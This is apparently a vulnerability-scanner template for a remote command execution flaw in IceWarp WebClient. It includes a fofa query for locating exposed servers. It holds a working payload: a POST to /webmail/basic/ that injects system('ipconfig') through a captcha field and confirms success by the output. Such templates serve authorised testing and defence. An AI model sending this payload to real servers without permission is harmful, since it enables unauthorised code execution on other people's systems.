expression: r0()
id: icewarp-webclient-basic-rce
info:
  author: daffainfo
  description: "IceWarp WebClient \u5B58\u5728\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\
    \u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u6784\u9020\u7279\u6B8A\u7684\u8BF7\u6C42\
    \u5373\u53EF\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\nfofa-query: app=\"IceWarp-\u516C\
    \u53F8\u4EA7\u54C1\"\n"
  name: "IceWarp WebClient basic \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/IceWarp%20WebClient%20basic%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 302  && response.body.bcontains(b'Windows IP')
    request:
      body: '_dlg[captcha][target]=system(\''ipconfig\'')\

        '
      headers:
        Cookie: use_cookies=1
      method: POST
      path: /webmail/basic/
